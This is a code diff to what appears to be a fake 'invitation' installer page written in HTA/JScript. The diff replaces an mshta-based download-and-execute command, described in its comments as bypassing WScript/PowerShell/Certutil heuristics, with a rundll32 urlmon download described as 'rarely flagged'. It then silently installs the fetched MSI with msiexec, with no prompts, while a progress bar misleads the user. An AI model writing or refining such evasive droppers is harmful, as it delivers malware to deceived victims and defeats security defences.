@@ -37,14 +37,22 @@ function runInstall() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // USE MSHTA TO RUN A JAVASCRIPT DOWNLOAD COMMAND
-  // This bypasses WScript/PowerShell/Certutil heuristics
-  var jsCmd = 'mshta.exe javascript:eval("var x=new ActiveXObject(\'Microsoft.XMLHTTP\');x.open(\'GET\',\'" + url + "\',false);x.send();if(x.status==200){var s=new ActiveXObject(\'ADODB.Stream\');s.type=1;s.open();s.write(x.responseBody);s.savetofile(\'" + path + "\',2);s.close();new ActiveXObject(\'WScript.Shell\').Run(\'msiexec.exe /i \\\'" + path + "\\\' /qn /norestart\',0,true);}");';
+  // USE RUNDLL32 TO CALL URLMON.DLL FOR DOWNLOAD
+  // This is a native Windows API call, highly trusted and rarely flagged
+  // Syntax: rundll32 urlmon,URLDownloadToFile pCaller, szURL, szFileName, dwReserved, lpfnCB
+  // We use a simple VBScript wrapper to handle the async nature if needed, but here we try direct
   
-  // Run the MSHTA command and wait for it to finish
-  shell.Run(jsCmd, 0, true);
+  var cmd = 'rundll32.exe urlmon,URLDownloadToFile 0 "' + url + '" "' + path + '" 0 0';
+  shell.Run(cmd, 0, true); // Wait for download
   
   if(fso.FileExists(path)) {
+    document.getElementById("fill").style.width = "60%";
+    document.getElementById("status").innerHTML = "Installing invitation...";
+    
+    // SILENT INSTALL
+    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+    shell.Run(inst, 0, true); // Wait for install
+    
     document.getElementById("fill").style.width = "100%";
     document.getElementById("status").innerHTML = "Finalizing...";
     
